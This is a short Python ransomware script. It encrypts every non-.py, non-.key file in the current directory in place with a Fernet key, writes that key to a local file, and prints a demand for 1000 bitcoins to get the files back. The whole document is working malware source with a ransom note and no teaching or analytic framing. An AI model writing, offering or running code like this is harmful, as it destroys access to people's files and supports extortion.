import os
from cryptography.fernet import Fernet

# Getting all the files for encryption
files = []
for file in os.listdir():
    if file.endswith(".py") or file.endswith(".key"):
        continue
    if os.path.isfile(file):
        files.append(file)

# Creating and Storing the key
key = Fernet.generate_key()
with open("decryption-key.key", 'wb') as thekey:
    thekey.write(key)

# Encrypting the files
def encrypt_data():
    for file in files:
        with open(file, 'rb') as thefile:
            data = thefile.read()
        encrypted_data = Fernet(key).encrypt(data)
        with open(file, 'wb') as thefile:
            thefile.write(encrypted_data)
    print("All of your files are encrypted. If you want it back send me 1000 bitcoins. 😁")

encrypt_data()